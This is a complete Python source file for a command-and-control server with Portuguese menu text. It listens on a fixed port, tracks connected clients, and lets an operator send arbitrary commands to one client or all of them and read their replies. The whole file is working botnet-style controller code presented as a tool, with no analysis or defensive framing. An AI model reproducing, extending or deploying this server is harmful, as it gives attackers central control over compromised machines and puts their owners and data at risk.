import socket
import threading

HOST = '0.0.0.0'
PORT = 10352

clients = []
lock = threading.Lock()

def banner():
    return """
===========================================
|        COMMAND & CONTROL SERVER        |
===========================================
Comandos:
- /list                     -> lista clientes
- /send <id> <cmd>         -> envia comando
- /all <cmd>               -> envia para todos
- /quit                    -> sair
===========================================
"""

def list_clients():
    with lock:
        if not clients:
            return "Nenhum cliente conectado."
        return "\n".join([f"ID {i} - {addr}" for i, (sock, addr) in enumerate(clients)])

def broadcast(command, sender=None):
    with lock:
        for sock, addr in clients:
            if sock != sender:
                try:
                    sock.sendall(command.encode())
                except:
                    pass

def send_to_client(client_id, command):
    with lock:
        if 0 <= client_id < len(clients):
            sock = clients[client_id][0]
            sock.sendall(command.encode())
            return f"Comando enviado para ID {client_id}"
        else:
            return "ID inválido"

def handle_client(sock, addr):
    print(f"[+] Cliente conectado: {addr}")
    
    try:
        sock.send(banner().encode())

        while True:
            data = sock.recv(4096)
            if not data:
                break

            print(f"[RESPOSTA {addr}]:\n{data.decode()}")

    except Exception as e:
        print(f"[ERRO] {addr}: {e}")

    finally:
        with lock:
            clients.remove((sock, addr))
        sock.close()
        print(f"[-] Cliente desconectado: {addr}")

def command_panel():
    while True:
        cmd = input("C2> ")

        if cmd == "/list":
            print(list_clients())

        elif cmd.startswith("/send"):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                print("Uso: /send <id> <comando>")
                continue
            
            client_id = int(parts[1])
            command = parts[2]
            print(send_to_client(client_id, command))

        elif cmd.startswith("/all"):
            command = cmd.replace("/all ", "", 1)
            broadcast(command)
            print("Comando enviado para todos.")

        elif cmd == "/quit":
            print("Encerrando servidor...")
            break

def start():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)

    print(f"[*] Servidor rodando em {HOST}:{PORT}")

    threading.Thread(target=command_panel, daemon=True).start()

    while True:
        sock, addr = server.accept()

        with lock:
            clients.append((sock, addr))

        thread = threading.Thread(target=handle_client, args=(sock, addr))
        thread.start()

if __name__ == "__main__":
    start()
